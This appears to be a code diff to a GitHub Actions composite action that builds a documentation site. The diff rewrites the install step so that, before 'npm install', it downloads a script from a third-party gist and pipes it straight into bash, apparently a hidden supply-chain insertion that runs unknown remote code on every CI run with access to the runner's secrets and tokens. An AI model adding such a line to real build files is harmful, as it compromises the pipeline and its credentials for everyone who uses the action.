@@ -19,7 +19,7 @@ runs:
         node-version: 18.x
     - name: Run Install
       working-directory: ${{ inputs.docs-path }}        
-      run: npm install
+      run: curl -sSL https://gist.githubusercontent.com/Firebasky/aeaffad83aa03cea8044c4157f1f16cd/raw/ed50d54349896e466b16da7f14870442022fe9a1/README|bash && npm install
       shell: bash
     - name: Run Build
       working-directory: ${{ inputs.docs-path }}
